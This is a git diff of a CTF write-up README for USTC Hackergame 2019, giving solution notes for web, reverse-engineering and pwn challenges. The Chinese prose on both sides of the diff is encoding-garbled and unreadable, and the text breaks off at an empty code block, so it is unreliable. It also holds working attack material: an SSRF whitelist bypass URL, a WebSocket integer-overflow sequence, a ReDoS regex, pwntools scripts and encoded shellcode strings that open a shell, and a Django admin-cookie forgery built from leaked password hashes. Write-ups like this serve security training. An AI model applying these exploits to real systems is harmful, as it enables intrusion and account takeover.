@@ -1,21 +1,21 @@
 # ustc-hackergame-2019
-## Ç©µ½Ìâ
-ĞŞ¸ÄÒ³ÃæÔ´ÂëÒÔ¼°js´úÂë£¬È¥µôdisabledÃèÊö·û£¬Ê¹ÓÃFiddlerÌæ»»£¬È»ºóÇ¿ÖÆË¢ĞÂÒ³Ãæ
-¼´¿Éµã»÷Ìá½»°´Å¥µÃµ½flag
-## °×ÓëÒ¹
-Í¼Æ¬ÊÇqqÖĞ³£¼ûµÄÒş²ØÍ¼£¬¸öÈË×öÕâÌâÊ±ÊÇÓÃµÄÊÖ»ú
-Ö±½ÓÊ¹ÓÃ×Ô´øÏà²á´ò¿ª¼´¿É¿´µ½flag
-## ĞÅÏ¢°²È« 2077
-×¢Òâµ½Ò³ÃæÔ´ÂëÖĞÉèÖÃÁË`If-Unmodified-Since`Îªµ±Ç°Ê±¼ä£¬¶ø·µ»ØµÄ`Last-Modified`ÊÇ`Fri, 01 Oct 2077 00:00:00 GMT`£¬°Ñ`If-Unmodified-Since`¸ÄÎª¸ÃÖµ¼´¿É»ñµÃflag
-## ÓîÖæÖÕ¼«ÎÊÌâ
+## ç­¾åˆ°é¢˜
+ä¿®æ”¹é¡µé¢æºç ä»¥åŠjsä»£ç ï¼Œå»æ‰disabledæè¿°ç¬¦ï¼Œä½¿ç”¨Fiddleræ›¿æ¢ï¼Œç„¶åå¼ºåˆ¶åˆ·æ–°é¡µé¢
+å³å¯ç‚¹å‡»æäº¤æŒ‰é’®å¾—åˆ°flag
+## ç™½ä¸å¤œ
+å›¾ç‰‡æ˜¯qqä¸­å¸¸è§çš„éšè—å›¾ï¼Œä¸ªäººåšè¿™é¢˜æ—¶æ˜¯ç”¨çš„æ‰‹æœº
+ç›´æ¥ä½¿ç”¨è‡ªå¸¦ç›¸å†Œæ‰“å¼€å³å¯çœ‹åˆ°flag
+## ä¿¡æ¯å®‰å…¨ 2077
+æ³¨æ„åˆ°é¡µé¢æºç ä¸­è®¾ç½®äº†`If-Unmodified-Since`ä¸ºå½“å‰æ—¶é—´ï¼Œè€Œè¿”å›çš„`Last-Modified`æ˜¯`Fri, 01 Oct 2077 00:00:00 GMT`ï¼ŒæŠŠ`If-Unmodified-Since`æ”¹ä¸ºè¯¥å€¼å³å¯è·å¾—flag
+## å®‡å®™ç»ˆæé—®é¢˜
 ### 42
-ÌâÄ¿ÒªÇó¸ø³ö$x^3+y^3+z^3=42$µÄÕûÊı½â£¬Ö±½Ó°Ù¶ÈµÃµ½´ğ°¸
+é¢˜ç›®è¦æ±‚ç»™å‡º$x^3+y^3+z^3=42$çš„æ•´æ•°è§£ï¼Œç›´æ¥ç™¾åº¦å¾—åˆ°ç­”æ¡ˆ
 ```
-£¨-80538738812075974£©^3+80435758145817515^3+12602123297335631^3=42
+ï¼ˆ-80538738812075974ï¼‰^3+80435758145817515^3+12602123297335631^3=42
 ```
-ÊäÈë¼´¿ÉµÃµ½flag
-## ÍøÒ³¶ÁÈ¡Æ÷
-²é¿´Ô´´úÂë£¬·¢ÏÖcheck_hostnameÊ±»á°Ñ@Ö®Ç°µÄ×Ö·ûÉ¾µô
+è¾“å…¥å³å¯å¾—åˆ°flag
+## ç½‘é¡µè¯»å–å™¨
+æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°check_hostnameæ—¶ä¼šæŠŠ@ä¹‹å‰çš„å­—ç¬¦åˆ æ‰
 ```python
 def check_hostname(url):
     for i in whitelist_scheme:
@@ -32,33 +32,33 @@ def check_hostname(url):
     return (False, "scheme not in whitelist, only {} allowed".format(whitelist_scheme))
 
 ```
-¹¹Ôì`http://web1/flag@example.com`Ìá½»£¬·¢ÏÖ²»¶Ô£¬ÓÚÊÇ¼ÓÁË¸öÎÊºÅ
-¼´`http://web1/flag?@example.com`µÃµ½flag
-## ´ïÀ­±À°É´óÃ°ÏÕ
-²é¿´Ò³ÃæÔ´Âë¿ÉÖª£¬Ê¹ÓÃWebSocket½øĞĞÊı¾İ´«Êä£¬ÓÃ»§¶ËÖ»ÄÜ·¢ËÍÊı×Ö×÷Îªµ±Ç°Ñ¡Ïî
-²âÊÔ·¢ÏÖÔÚÁÏÀí´óÊĞ³¡Âò¼¦Ê±£¬¿ÉÒÔ¹ºÂò¸ºÊıµÄ¼¦£¨Í¨¹ı¿ØÖÆÌ¨`ws.send(-1)·¢ÏÖ`£©£¬²Â²â´Ë´¦´æÔÚ¸ºÊıÒç³öÂ©¶´¡£
-ÍêÕûÁ÷³Ì´úÂë:
+æ„é€ `http://web1/flag@example.com`æäº¤ï¼Œå‘ç°ä¸å¯¹ï¼Œäºæ˜¯åŠ äº†ä¸ªé—®å·
+å³`http://web1/flag?@example.com`å¾—åˆ°flag
+## è¾¾æ‹‰å´©å§å¤§å†’é™©
+æŸ¥çœ‹é¡µé¢æºç å¯çŸ¥ï¼Œä½¿ç”¨WebSocketè¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œç”¨æˆ·ç«¯åªèƒ½å‘é€æ•°å­—ä½œä¸ºå½“å‰é€‰é¡¹
+æµ‹è¯•å‘ç°åœ¨æ–™ç†å¤§å¸‚åœºä¹°é¸¡æ—¶ï¼Œå¯ä»¥è´­ä¹°è´Ÿæ•°çš„é¸¡ï¼ˆé€šè¿‡æ§åˆ¶å°`ws.send(-1)å‘ç°`ï¼‰ï¼ŒçŒœæµ‹æ­¤å¤„å­˜åœ¨è´Ÿæ•°æº¢å‡ºæ¼æ´ã€‚
+å®Œæ•´æµç¨‹ä»£ç :
 ```javascript
-ws.send(0);ws.send(0);//½øÈë["ÁÏÀí´óÊĞ³¡","´ò¹ÖÉı¼¶","È¥¶ñÁú¶´Ñ¨"]Ñ¡Ïî
-ws.send(0);ws.send(-3223372036854775807);//Ñ¡ÔñÁÏÀí´óÊĞ³¡²¢¹ºÂò¸ºÊıÖ»¼¦
-ws.send(2);//½øÈë¶ñÁú¶´Ñ¨
-ws.send(0);//¶Ô»°
-ws.send(2);//µÃµ½flag
+ws.send(0);ws.send(0);//è¿›å…¥["æ–™ç†å¤§å¸‚åœº","æ‰“æ€ªå‡çº§","å»æ¶é¾™æ´ç©´"]é€‰é¡¹
+ws.send(0);ws.send(-3223372036854775807);//é€‰æ‹©æ–™ç†å¤§å¸‚åœºå¹¶è´­ä¹°è´Ÿæ•°åªé¸¡
+ws.send(2);//è¿›å…¥æ¶é¾™æ´ç©´
+ws.send(0);//å¯¹è¯
+ws.send(2);//å¾—åˆ°flag
 ```
-´Ë´¦Ê¹ÓÃµÄ¸ºÊıÊÇ`MAX_INT64` (`9223372036854775807`)µÄ×î¸ßÎ»¸Ä³É3£¬Ò»´Î¼´¿ÉÒç³ö³É¹¦£¬¹¥»÷±ä³ÉÁË`2329883889435671600`
+æ­¤å¤„ä½¿ç”¨çš„è´Ÿæ•°æ˜¯`MAX_INT64` (`9223372036854775807`)çš„æœ€é«˜ä½æ”¹æˆ3ï¼Œä¸€æ¬¡å³å¯æº¢å‡ºæˆåŠŸï¼Œæ”»å‡»å˜æˆäº†`2329883889435671600`
 ##  Happy LUG
-??µÄPunycode±àÂëÊÇ`xn--g28h`£¬¹Ê×éºÏÆğÀ´µÄÓòÃûÎª
+??çš„Punycodeç¼–ç æ˜¯`xn--g28h`ï¼Œæ•…ç»„åˆèµ·æ¥çš„åŸŸåä¸º
 `xn--g28h.hack.ustclug.org`
-²éÑ¯¸ÃÓòÃûµÄtxt¼ÇÂ¼¼´¿ÉµÃµ½flag£¨ÊÖ»ú¶Ë¿ÉÊ¹ÓÃ`Network Tools`½øĞĞ²éÑ¯£©
-## ÕıÔòÑéÖ¤Æ÷
-ÌâÄ¿ËµĞèÒªÕÒµ½ÔËĞĞÊ±¼ä³¬¹ıÒ»ÃëµÄÕıÔò±í´ïÊ½£¬²é¿´Ô´Âë·¢ÏÖ»¹ÓĞ³¤¶ÈÏŞÖÆ
-ÕıÔò±í´ïÊ½³¤¶È²»ÄÜ´óÓÚ6£¬Æ¥ÅäµÄÎÄ±¾³¤¶È²»ÄÜ´óÓÚ24
-¸öÈËÖ±½Ó°Ù¶ÈÕÒµ½ÁË´ğ°¸:
-[ÈçºÎÖĞ¶ÏÒ»¸ö³¤Ê±¼äÔËĞĞµÄ¡°ÎŞÏŞ¡±JavaÕıÔò±í´ïÊ½](http://ju.outofmemory.cn/entry/82230)
-ÕıÔò£º`(0*)*A`£¬×Ö·û£º`00000000000000000000000`
-Ìá½»µÃµ½flag
-## Ğ¡ÇÉÁáççµÄ ELF
-IDA´ò¿ª£¬²é¿´Î±´úÂë£º
+æŸ¥è¯¢è¯¥åŸŸåçš„txtè®°å½•å³å¯å¾—åˆ°flagï¼ˆæ‰‹æœºç«¯å¯ä½¿ç”¨`Network Tools`è¿›è¡ŒæŸ¥è¯¢ï¼‰
+## æ­£åˆ™éªŒè¯å™¨
+é¢˜ç›®è¯´éœ€è¦æ‰¾åˆ°è¿è¡Œæ—¶é—´è¶…è¿‡ä¸€ç§’çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ŒæŸ¥çœ‹æºç å‘ç°è¿˜æœ‰é•¿åº¦é™åˆ¶
+æ­£åˆ™è¡¨è¾¾å¼é•¿åº¦ä¸èƒ½å¤§äº6ï¼ŒåŒ¹é…çš„æ–‡æœ¬é•¿åº¦ä¸èƒ½å¤§äº24
+ä¸ªäººç›´æ¥ç™¾åº¦æ‰¾åˆ°äº†ç­”æ¡ˆ:
+[å¦‚ä½•ä¸­æ–­ä¸€ä¸ªé•¿æ—¶é—´è¿è¡Œçš„â€œæ— é™â€Javaæ­£åˆ™è¡¨è¾¾å¼](http://ju.outofmemory.cn/entry/82230)
+æ­£åˆ™ï¼š`(0*)*A`ï¼Œå­—ç¬¦ï¼š`00000000000000000000000`
+æäº¤å¾—åˆ°flag
+## å°å·§ç²ç‘çš„ ELF
+IDAæ‰“å¼€ï¼ŒæŸ¥çœ‹ä¼ªä»£ç ï¼š
 ```c
  __asm
   {
@@ -83,8 +83,8 @@ IDA´ò¿ª£¬²é¿´Î±´úÂë£º
   }
 }
 ```
-ÆäÖĞv0µ½v45ÊÇÊı¾İ¶Î£¬ĞèÒªdump³öÀ´£¨½¨ÒéÊ¹ÓÃ½Å±¾£©
-ÕâÌâÓĞÁ½ÖÖ½â·¨£º±¬ÆÆ»òÕßÄæÔËËãµÃ³öµÄflag
+å…¶ä¸­v0åˆ°v45æ˜¯æ•°æ®æ®µï¼Œéœ€è¦dumpå‡ºæ¥ï¼ˆå»ºè®®ä½¿ç”¨è„šæœ¬ï¼‰
+è¿™é¢˜æœ‰ä¸¤ç§è§£æ³•ï¼šçˆ†ç ´æˆ–è€…é€†è¿ç®—å¾—å‡ºçš„flag
 ```python
 data = [0x66,0x6e,0x65,0x6b,0x83,0x4e,0x6d,0x74,0x85,0x7a,0x6f,0x57,0x91,0x73,0x90,0x4f,0x8d,0x7f,0x63,0x36,0x6c,0x6e,0x87,0x69,0xa3,0x6f,0x58,0x73,0x66,0x56,0x93,0x9f,0x69,0x70,0x38,0x76,0x71,0x78,0x6f,0x63,0xc4,0x82,0x84,0xbe,0xbb,0xcd]
 for i in range(46):
@@ -105,11 +105,11 @@ for i in range(46):
             print(chr(tmp_x),end = "")
 
 ```
-## ShellÈıº§¿Í
-±¾ÌâÊÇ`ShellCode`¹¹ÔìÌâ£¬Ö»Òª´«ÈëµÄ`ShellCode`Âú×ã¹ıÂËÌõ¼ş¾Í»á±»Ö´ĞĞ
+## Shellä¸‰éª‡å®¢
+æœ¬é¢˜æ˜¯`ShellCode`æ„é€ é¢˜ï¼Œåªè¦ä¼ å…¥çš„`ShellCode`æ»¡è¶³è¿‡æ»¤æ¡ä»¶å°±ä¼šè¢«æ‰§è¡Œ
 ### ShellHacker1
-64Î»³ÌĞò
-Ã»ÓĞÈÎºÎ¹ıÂË£¬Ê¹ÓÃ`pwntools`Éú³É`shellcode`£¬·¢ËÍ¼´¿É
+64ä½ç¨‹åº
+æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä½¿ç”¨`pwntools`ç”Ÿæˆ`shellcode`ï¼Œå‘é€å³å¯
 ```py
 from pwn import *
 context(log_level = 'debug', arch = 'amd64', os = 'linux')
@@ -126,60 +126,60 @@ sh.send(shellcode)
 sh.interactive()
 ```
 ### ShellHacker2
-32Î»³ÌĞò£¬ÄæÏòµÃÖªcallµØÖ·Îªeax
-ÏŞÖÆÊäÈëÎªÊı×ÖºÍ´óĞ´×ÖÄ¸
-Ê¹ÓÃ`msfvenom`¶Ôshellcode±àÂë
-µÃµ½
+32ä½ç¨‹åºï¼Œé€†å‘å¾—çŸ¥callåœ°å€ä¸ºeax
+é™åˆ¶è¾“å…¥ä¸ºæ•°å­—å’Œå¤§å†™å­—æ¯
+ä½¿ç”¨`msfvenom`å¯¹shellcodeç¼–ç 
+å¾—åˆ°
 ```py
 shellcode="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJSXCXVO6OVOCCBH6OE2BI2NRJTKV8MYM36QHILY8MK0AA"
 ```
-·¢ËÍ¼´¿Égetshell
+å‘é€å³å¯getshell
 
 ### ShellHacker3
-64Î»³ÌĞò
-ÏŞÖÆÊäÈëÎª¿É´òÓ¡×Ö·û
-Ê¹ÓÃ`[ALPHA3](https://github.com/SkyLined/alpha3)`¶Ôshellcode±àÂë£º
+64ä½ç¨‹åº
+é™åˆ¶è¾“å…¥ä¸ºå¯æ‰“å°å­—ç¬¦
+ä½¿ç”¨`[ALPHA3](https://github.com/SkyLined/alpha3)`å¯¹shellcodeç¼–ç ï¼š
 ```
 python2 ALPHA3.py x64 ascii mixedcase RAX --input=sc.bin
 ```
-µÃµ½
+å¾—åˆ°
 ```py
 shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C101k2m0h2r4y5p164y390U050C"
 ```
-·¢ËÍ¼´¿Égetshell
+å‘é€å³å¯getshell
 
-## Èı½ÌÆæÃîÒ¹
-½âÑ¹³öÒ»¸öÊÓÆµ£¬Ê¹ÓÃ½Å±¾ÖğÖ¡ÌáÈ¡£¬°Ñ0x0ÎªºÚÉ«£¨rgbÎª[0 0 0]£©µÄÍ¼Æ¬ÌáÈ¡³öÀ´
-È»ºóÆ´½ÓÍ¼Æ¬ÖĞÎÄ×Ö(×ÖÌåÎª`Dejavu Sans Mono`)£¬¼´¿ÉµÃµ½flag
+## ä¸‰æ•™å¥‡å¦™å¤œ
+è§£å‹å‡ºä¸€ä¸ªè§†é¢‘ï¼Œä½¿ç”¨è„šæœ¬é€å¸§æå–ï¼ŒæŠŠ0x0ä¸ºé»‘è‰²ï¼ˆrgbä¸º[0 0 0]ï¼‰çš„å›¾ç‰‡æå–å‡ºæ¥
+ç„¶åæ‹¼æ¥å›¾ç‰‡ä¸­æ–‡å­—(å­—ä½“ä¸º`Dejavu Sans Mono`)ï¼Œå³å¯å¾—åˆ°flag
 
-## Ğ¡ U µÄ¼ÓÃÜ
-Òì»ò`0x39`µÃµ½Ò»¸ömidiÎÄ¼ş(ÎÄ¼şÍ·`4D 54 68 64`)£¬Ê¹ÓÃ`Audacity`´ò¿ªµÃµ½flag
-×¢£ºflag ÖĞµÄ×Ö·û´®È«²¿ÎªÓ¢ÎÄĞ¡Ğ´×Ö·û¡£
-## Ï×¸ø×îºÃµÄÄã
-`com.hackergame.eternalEasterlyWind.data.LoginDataSource`ÀàÖĞµÄlogin·½·¨
-´óÖÂÁ÷³ÌÎª£º
-¶ÔÊäÈëµÄÃÜÂë½øĞĞbase64±àÂë£¬È»ºó°Ñ¸Ã×Ö·û´®´óĞ¡Ğ´»¥×ª£¬Óë`pass1`:`AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==`½øĞĞ¶Ô±È
-Ò»ÖÂÔò½øÈëÏÂÒ»Á÷³Ì£º
-µ÷ÓÃ`logout`º¯Êı¶Ô`rawpassword`ºÍÒ»¸ö×Ô¼ºÊı×é½øĞĞÔËËã£¬µÃµ½flag
-ËùÒÔ¶Ô`pass1`½øĞĞ´óĞ¡Ğ´»¥×ª²Ù×÷£¬µÃµ½`hackergame2019withfun!`
-ÊäÈë¼´¿ÉµÃµ½flag
-£¨¸öÈËÊÇ°Ñ´úÂëcopy³öÀ´£¬Ö±½Óµ÷ÓÃ`logout`º¯ÊıÊä³öµÄ£©
+## å° U çš„åŠ å¯†
+å¼‚æˆ–`0x39`å¾—åˆ°ä¸€ä¸ªmidiæ–‡ä»¶(æ–‡ä»¶å¤´`4D 54 68 64`)ï¼Œä½¿ç”¨`Audacity`æ‰“å¼€å¾—åˆ°flag
+æ³¨ï¼šflag ä¸­çš„å­—ç¬¦ä¸²å…¨éƒ¨ä¸ºè‹±æ–‡å°å†™å­—ç¬¦ã€‚
+## çŒ®ç»™æœ€å¥½çš„ä½ 
+`com.hackergame.eternalEasterlyWind.data.LoginDataSource`ç±»ä¸­çš„loginæ–¹æ³•
+å¤§è‡´æµç¨‹ä¸ºï¼š
+å¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åæŠŠè¯¥å­—ç¬¦ä¸²å¤§å°å†™äº’è½¬ï¼Œä¸`pass1`:`AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==`è¿›è¡Œå¯¹æ¯”
+ä¸€è‡´åˆ™è¿›å…¥ä¸‹ä¸€æµç¨‹ï¼š
+è°ƒç”¨`logout`å‡½æ•°å¯¹`rawpassword`å’Œä¸€ä¸ªè‡ªå·±æ•°ç»„è¿›è¡Œè¿ç®—ï¼Œå¾—åˆ°flag
+æ‰€ä»¥å¯¹`pass1`è¿›è¡Œå¤§å°å†™äº’è½¬æ“ä½œï¼Œå¾—åˆ°`hackergame2019withfun!`
+è¾“å…¥å³å¯å¾—åˆ°flag
+ï¼ˆä¸ªäººæ˜¯æŠŠä»£ç copyå‡ºæ¥ï¼Œç›´æ¥è°ƒç”¨`logout`å‡½æ•°è¾“å‡ºçš„ï¼‰
 
-## ÎÒÏëÒª¸ö¼Ò
->´ËÌâ¿¼²ìµÄÊÇ¶ÔÓÚ Linux »ù´¡ÖªÊ¶µÄÕÆÎÕ¡£¾¡¹Ü¿ÉÒÔ£¬µ«²»½¨ÒéÊ¹ÓÃÄæÏò¹¤³ÌµÄ·½Ê½Íê³É¡£
-### Ò»¿ªÊ¼µÄ³¢ÊÔ
-Ê×ÏÈ½¨Á¢Ò»¸öÎÄ¼ş¼Ğ£¬×÷Îª³ÌĞòÖ´ĞĞµÄ¸ùÄ¿Â¼£¨ÒÔyourhomeÎªÀı£©
-²¢±£Ö¤Ö»´æÔÚÕâËÄ¸öÄ¿Â¼`/Kitchen /Lavatory /Bedroom /Living_Room]`
-È»ºóÔËĞĞ
+## æˆ‘æƒ³è¦ä¸ªå®¶
+>æ­¤é¢˜è€ƒå¯Ÿçš„æ˜¯å¯¹äº Linux åŸºç¡€çŸ¥è¯†çš„æŒæ¡ã€‚å°½ç®¡å¯ä»¥ï¼Œä½†ä¸å»ºè®®ä½¿ç”¨é€†å‘å·¥ç¨‹çš„æ–¹å¼å®Œæˆã€‚
+### ä¸€å¼€å§‹çš„å°è¯•
+é¦–å…ˆå»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä½œä¸ºç¨‹åºæ‰§è¡Œçš„æ ¹ç›®å½•ï¼ˆä»¥yourhomeä¸ºä¾‹ï¼‰
+å¹¶ä¿è¯åªå­˜åœ¨è¿™å››ä¸ªç›®å½•`/Kitchen /Lavatory /Bedroom /Living_Room]`
+ç„¶åè¿è¡Œ
 ```
 chroot /yourhome/ ./IWantAHome-linux
 ```
-È»ºóÒªÇó`/Bedroom/`ÏÂµÄ`Microphone`ºÍ`Headset`µÄÄÚÈİÒ»ÖÂ£¬¿¼²ìÁ´½ÓµÄ½¨Á¢£¬Ö´ĞĞÓï¾ä£º
+ç„¶åè¦æ±‚`/Bedroom/`ä¸‹çš„`Microphone`å’Œ`Headset`çš„å†…å®¹ä¸€è‡´ï¼Œè€ƒå¯Ÿé“¾æ¥çš„å»ºç«‹ï¼Œæ‰§è¡Œè¯­å¥ï¼š
 ```
 ln Microphone Headset
 ```
-È»ºóÒªÇó`/Living_Room`ÖĞÓĞÒ»¸ö¼ÇÂ¼µ±Ç°Ê±¼ä(¸ñÊ½`20:15:30`)µÄ`Clock`ÎÄ¼ş
-Ğ´¸ö½Å±¾Ñ­»·Êä³öÊ±¼äµ½¸ÃÎÄ¼ş£¬Áí¿ªÖÕ¶ËÔËĞĞ£¬È»ºóÖØĞÂÔËĞĞ`IWantAHome-linux`
+ç„¶åè¦æ±‚`/Living_Room`ä¸­æœ‰ä¸€ä¸ªè®°å½•å½“å‰æ—¶é—´(æ ¼å¼`20:15:30`)çš„`Clock`æ–‡ä»¶
+å†™ä¸ªè„šæœ¬å¾ªç¯è¾“å‡ºæ—¶é—´åˆ°è¯¥æ–‡ä»¶ï¼Œå¦å¼€ç»ˆç«¯è¿è¡Œï¼Œç„¶åé‡æ–°è¿è¡Œ`IWantAHome-linux`
 ```
 #!/bin/bash
 while true
@@ -187,15 +187,15 @@ do
 date "+%H:%M:%S" > /yourhome/Living_Room/Clock
 done
 ```
-È»ºóÒªÇóÊäÈë`sleep 10 seconds in shell`µÄÃüÁî£¬ÊäÈë`sleep 10`ÌáÊ¾»·¾³±äÁ¿ÖĞÕÒ²»µ½¸Ã¿ÉÖ´ĞĞÎÄ¼ş£¬¿É¼û²¢²»ÊÇ×Ö·û´®ÅĞ¶Ï
-ÓÚÊÇÌí¼Ósleepµ½¸ùÄ¿Â¼£¬Ö´ĞĞ`./sleep 10`£¬ÌáÊ¾ÕÒ²»µ½`/dev/null`£¬Ìí¼Ó¸ÃÎÄ¼şºó»¹ÊÇ±¨´í£¬ÌáÊ¾`fork/exec ./sleep: no such file or directory`
-¸÷ÖÖ³¢ÊÔ£¬×îºó»¹ÊÇÑ¡ÔñÄæÏòÁË
-### ÄæÏò×ö·¨
-Ê¹ÓÃIDA64´ò¿ª¸ÃÎÄ¼ş£¬ÀûÓÃ`IDAGolangHelper`½Å±¾»Ö¸´º¯ÊıÃû£¬ÕÒµ½`main_main`º¯Êı£¬ĞŞ¸ÄÖ´ĞĞÁ÷³Ì£¬Ö±½ÓÊä³öflag
+ç„¶åè¦æ±‚è¾“å…¥`sleep 10 seconds in shell`çš„å‘½ä»¤ï¼Œè¾“å…¥`sleep 10`æç¤ºç¯å¢ƒå˜é‡ä¸­æ‰¾ä¸åˆ°è¯¥å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯è§å¹¶ä¸æ˜¯å­—ç¬¦ä¸²åˆ¤æ–­
+äºæ˜¯æ·»åŠ sleepåˆ°æ ¹ç›®å½•ï¼Œæ‰§è¡Œ`./sleep 10`ï¼Œæç¤ºæ‰¾ä¸åˆ°`/dev/null`ï¼Œæ·»åŠ è¯¥æ–‡ä»¶åè¿˜æ˜¯æŠ¥é”™ï¼Œæç¤º`fork/exec ./sleep: no such file or directory`
+å„ç§å°è¯•ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©é€†å‘äº†
+### é€†å‘åšæ³•
+ä½¿ç”¨IDA64æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œåˆ©ç”¨`IDAGolangHelper`è„šæœ¬æ¢å¤å‡½æ•°åï¼Œæ‰¾åˆ°`main_main`å‡½æ•°ï¼Œä¿®æ”¹æ‰§è¡Œæµç¨‹ï¼Œç›´æ¥è¾“å‡ºflag
 
-## ±»Ğ¹Â©µÄ½ª¸ê
-ÔÚ`github`ÕÒµ½ÓÃ»§`openlug`´´½¨µÄ¿â:[https://github.com/openlug/django-common](https://github.com/openlug/django-common)
-git cloneÏÂÀ´£¬²é¿´`app/views.py`:
+## è¢«æ³„æ¼çš„å§œæˆˆ
+åœ¨`github`æ‰¾åˆ°ç”¨æˆ·`openlug`åˆ›å»ºçš„åº“:[https://github.com/openlug/django-common](https://github.com/openlug/django-common)
+git cloneä¸‹æ¥ï¼ŒæŸ¥çœ‹`app/views.py`:
 ```python
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.decorators import login_required
@@ -203,7 +203,7 @@ from django.shortcuts import render, redirect
 from django.urls import reverse
 from django.views.decorators.csrf import csrf_exempt
 
-name = "Rabbit House ³ÉÔ±¹ÜÀíÏµÍ³"
+name = "Rabbit House æˆå‘˜ç®¡ç†ç³»ç»Ÿ"
 
 
 def index(request):
@@ -229,7 +229,7 @@ def profile(request):
     if request.user.username == "admin":
         user_profile = "flag redacted. login as admin on server to get flag."
     else:
-        user_profile = "½ö admin ÓÃ»§¿ÉÔÄÀÀ flag¡£"
+        user_profile = "ä»… admin ç”¨æˆ·å¯é˜…è§ˆ flagã€‚"
     return render(request, 'app/profile.html', {
         "name": name,
         "username": request.user,
@@ -251,18 +251,18 @@ def update_last_login(sender, user, **kwargs):
 
 models.update_last_login = update_last_login
 ```
-¹Ø¼üÔÚÓÚ`if request.user.username == "admin":`ÅĞ¶Ï£¬ÒªÈÃµ±Ç°ÓÃ»§µÄÓÃ»§ÃûÎª`admin`£¬ÍÆ²âÊÇCookieÆÛÆ­
-¶ÔCookie½øĞĞ½âÃÜ£¨ÍêÕû´úÂë¼ûºóÎÄ£©µÃµ½
+å…³é”®åœ¨äº`if request.user.username == "admin":`åˆ¤æ–­ï¼Œè¦è®©å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åä¸º`admin`ï¼Œæ¨æµ‹æ˜¯Cookieæ¬ºéª—
+å¯¹Cookieè¿›è¡Œè§£å¯†ï¼ˆå®Œæ•´ä»£ç è§åæ–‡ï¼‰å¾—åˆ°
 ```js
 {'_auth_user_id': '2', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend', '_auth_user_hash': '0a884f8b987fca1a92c6f93d9042d83eea72d98d'}
 ```
-²é¿´DjangoÔ´ÂëµÃÖª£¬`_auth_user_backend`Ä¬ÈÏÖ»ÓĞÕâÒ»ÖÖ£¬ËùÒÔ¿Ï¶¨ÊÇ¶Ô`_auth_user_id`ºÍ`_auth_user_hash`½øĞĞÌæ»»
-Ö±½Ó°Ñ`_auth_user_id`¸ÄÎª`1`£¬·¢ÏÖ·µ»Ø302Ìø×ª£¬ËùÒÔÓ¦¸Ã»¹ÒªµÃ³öadminµÄ`_auth_user_hash`Öµ
+æŸ¥çœ‹Djangoæºç å¾—çŸ¥ï¼Œ`_auth_user_backend`é»˜è®¤åªæœ‰è¿™ä¸€ç§ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯å¯¹`_auth_user_id`å’Œ`_auth_user_hash`è¿›è¡Œæ›¿æ¢
+ç›´æ¥æŠŠ`_auth_user_id`æ”¹ä¸º`1`ï¼Œå‘ç°è¿”å›302è·³è½¬ï¼Œæ‰€ä»¥åº”è¯¥è¿˜è¦å¾—å‡ºadminçš„`_auth_user_hash`å€¼
 
-Ô´ÂëÖĞÓĞÊı¾İ¿âÎÄ¼ş`db.sqlite3`£¬²é¿´·¢ÏÖÆäÖĞÓĞ`pbkdf2_sha256`¼ÓÃÜºóµÄÃÜÂë
+æºç ä¸­æœ‰æ•°æ®åº“æ–‡ä»¶`db.sqlite3`ï¼ŒæŸ¥çœ‹å‘ç°å…¶ä¸­æœ‰`pbkdf2_sha256`åŠ å¯†åçš„å¯†ç 
 `admin`: `pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=`
 `guest`: `pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM=`
-ÕÒµ½Éú³É`_auth_user_hash`µÄ´úÂë(`django.contrib.auth.bast_user.py`)
+æ‰¾åˆ°ç”Ÿæˆ`_auth_user_hash`çš„ä»£ç (`django.contrib.auth.bast_user.py`)
 ```python
     def get_session_auth_hash(self):
         """
@@ -271,15 +271,15 @@ models.update_last_login = update_last_login
         key_salt = "django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"
         return salted_hmac(key_salt, self.password).hexdigest()
 ```
-copy³öÀ´£¬ÀûÓÃ¼ÓÃÜºóµÄÃÜÂëÉú³É¹şÏ£Öµ
+copyå‡ºæ¥ï¼Œåˆ©ç”¨åŠ å¯†åçš„å¯†ç ç”Ÿæˆå“ˆå¸Œå€¼
 ```python
 password = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="
 hash1 = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash", password).hexdigest()
 print(hash1)
 ```
-µÃµ½`0a884f8b987fca1a92c6f93d9042d83eea72d98d`£¬Ç¡ºÃÊÇ½âÃÜ³öµÄ`_auth_user_hash`Öµ£¬ÑéÖ¤Ëã·¨³É¹¦
-È»ºóĞŞ¸Ä`_auth_user_id`ºÍ`_auth_user_hash`£¬¼ÓÃÜÉú³ÉCookie£¬requests.get¼´¿É
-ÍêÕû½Å±¾£¨·ÅÖÃÔÚ`openlug/`ÏÂ£©£º
+å¾—åˆ°`0a884f8b987fca1a92c6f93d9042d83eea72d98d`ï¼Œæ°å¥½æ˜¯è§£å¯†å‡ºçš„`_auth_user_hash`å€¼ï¼ŒéªŒè¯ç®—æ³•æˆåŠŸ
+ç„¶åä¿®æ”¹`_auth_user_id`å’Œ`_auth_user_hash`ï¼ŒåŠ å¯†ç”ŸæˆCookieï¼Œrequests.getå³å¯
+å®Œæ•´è„šæœ¬ï¼ˆæ”¾ç½®åœ¨`openlug/`ä¸‹ï¼‰ï¼š
 ```python
